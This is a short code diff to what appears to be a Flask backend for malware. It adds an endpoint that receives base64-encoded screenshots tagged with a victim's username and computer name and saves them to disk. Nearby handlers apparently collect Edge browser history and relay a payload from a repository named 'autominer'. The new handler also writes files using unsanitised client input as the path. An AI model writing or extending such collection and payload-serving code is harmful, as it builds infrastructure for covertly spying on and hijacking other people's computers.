@@ -324,6 +324,21 @@ def saveEdgeHistory():
         cur.close()
         con.close()
         return "ok"
+
+@app.route('/saveScreenshot', methods=['POST'])
+def saveScreenshot():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        key = data['data']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        key = base64.b64decode(key)
+        filename = "./screenshots/"+ \
+            str(int(time.time()))+"-"+username+"-"+ComputerName
+        with open(filename+".png", "wb") as f:
+            f.write(key)
+        return "ok"
+
 @app.route('/get')
 def get():
     return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text
